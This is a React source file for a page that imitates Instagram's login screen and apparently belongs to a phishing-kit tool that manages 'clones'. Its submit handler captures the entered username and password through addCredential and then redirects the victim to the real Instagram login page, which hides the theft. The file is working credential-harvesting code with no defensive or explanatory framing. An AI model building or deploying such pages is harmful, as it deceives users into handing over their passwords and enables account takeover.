'use client';
import { useState } from 'react';
import { useClones } from '@/hooks/use-clones';
import type { Clone } from '@/lib/types';
import { Facebook } from 'lucide-react';

const InstagramLogo = () => (
    <svg
      aria-label="Instagram"
      className="text-black fill-current"
      height="50"
      role="img"
      viewBox="0 0 95 95"
      width="50"
    >
      <path d="M47.5 0C21.2 0 0 21.2 0 47.5S21.2 95 47.5 95 95 73.8 95 47.5 73.8 0 47.5 0zm0 88C24.6 88 7 69.4 7 47.5S24.6 7 47.5 7 88 24.6 88 47.5 69.4 88 47.5 88z"></path>
      <path d="M47.5 24.3c-12.7 0-23.1 10.4-23.1 23.1s10.4 23.1 23.1 23.1 23.1-10.4 23.1-23.1-10.4-23.1-23.1-23.1zm0 39.1c-8.8 0-16-7.2-16-16s7.2-16 16-16 16 7.2 16 16-7.2 16-16 16z"></path>
      <circle cx="72.5" cy="22.5" r="4.3"></circle>
    </svg>
)

export default function InstagramPage({ clone }: { clone: Clone }) {
  const { addCredential } = useClones();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (username) {
        addCredential(clone.id, { username, password });
    }
    window.location.href = 'https://www.instagram.com/accounts/login/';
  };

  return (
    <div className="bg-[#fafafa] min-h-screen flex items-center justify-center font-sans">
      <main className="w-full max-w-[350px] space-y-2.5">
        <div className="bg-white border border-gray-300 p-10 flex flex-col items-center">
          <div className="w-[175px] h-[51px] mb-8 flex justify-center">
            {/* Using an SVG for the logo text would be more accurate, but this is a simplified version */}
            <h1 className="text-5xl font-serif">Instagram</h1>
          </div>
          <form onSubmit={handleSubmit} className="w-full space-y-2">
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              placeholder="Phone number, username, or email"
              className="w-full px-2 py-2.5 border border-gray-300 rounded-sm bg-[#fafafa] focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm"
              required
            />
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Password"
              className="w-full px-2 py-2.5 border border-gray-300 rounded-sm bg-[#fafafa] focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm"
            />
            <button
              type="submit"
              className="w-full bg-[#0095f6] text-white py-1.5 rounded-md font-semibold text-sm mt-2 opacity-90 hover:opacity-100 transition-opacity"
            >
              Log In
            </button>
          </form>
          <div className="flex items-center w-full my-4">
            <div className="flex-grow border-t border-gray-300"></div>
            <span className="px-4 text-xs font-semibold text-gray-500">OR</span>
            <div className="flex-grow border-t border-gray-300"></div>
          </div>
          <button className="flex items-center justify-center gap-2 text-sm font-semibold text-[#385185]">
            <Facebook className="w-5 h-5" />
            <span>Log in with Facebook</span>
          </button>
          <a href="#" className="text-xs text-[#00376b] mt-4">
            Forgot password?
          </a>
        </div>
        <div className="bg-white border border-gray-300 p-4 text-center text-sm">
          <p>
            Don't have an account?{' '}
            <a href="#" className="text-[#0095f6] font-semibold">
              Sign up
            </a>
          </p>
        </div>
      </main>
    </div>
  );
}
